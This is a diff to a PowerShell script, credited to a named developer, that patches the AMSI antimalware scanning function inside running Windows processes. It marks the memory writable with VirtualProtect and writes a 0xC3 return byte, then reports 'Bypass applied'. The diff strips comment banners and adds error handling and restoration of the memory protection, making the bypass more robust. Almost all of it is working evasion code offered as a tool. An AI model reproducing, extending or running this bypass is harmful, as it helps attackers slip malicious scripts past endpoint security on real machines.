@@ -1,4 +1,3 @@
-# ================= Banner =================
 $banner = @'
     --------------------------------------
      Developed by Chris Alupului | 9/12/25
@@ -9,7 +8,6 @@ $banner = @'
 Write-Host $banner -ForegroundColor Blue
 $null = Read-Host "Press Enter to continue"
 
-# ================= Win32 Interop =================
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -20,7 +18,6 @@ public class Neo {
 }
 "@
 
-# ================= Patch Function =================
 function Patch-AMSIProcess {
     param([System.Diagnostics.Process]$Process)
 
@@ -35,12 +32,22 @@ function Patch-AMSIProcess {
 
         $patchAddr = [IntPtr]($func.ToInt64() + 3)
         $oldProtect = 0
-        [Neo]::VirtualProtect($patchAddr, [UIntPtr]::new(1), 0x40, [ref]$oldProtect) | Out-Null
-        [System.Runtime.InteropServices.Marshal]::WriteByte($patchAddr, 0xC3)
 
+        $vpResult = [Neo]::VirtualProtect($patchAddr, [UIntPtr]::new(1), 0x40, [ref]$oldProtect)
+        if (-not $vpResult) {
+            Write-Host "Failed to change memory protection!" -ForegroundColor Red
+            return
+        }
+
+        [System.Runtime.InteropServices.Marshal]::WriteByte($patchAddr, 0xC3)
         Write-Host "Bypass applied to process $($Process.Id)" -ForegroundColor Green
-    }
-    catch {
+
+        $restoreResult = [Neo]::VirtualProtect($patchAddr, [UIntPtr]::new(1), $oldProtect, [ref]$oldProtect)
+        if (-not $restoreResult) {
+            Write-Host "Warning: Failed to restore original memory protection!" -ForegroundColor Yellow
+        }
+
+    } catch {
         Write-Host "Error patching process $($Process.Id): $_" -ForegroundColor Red
     }
 }
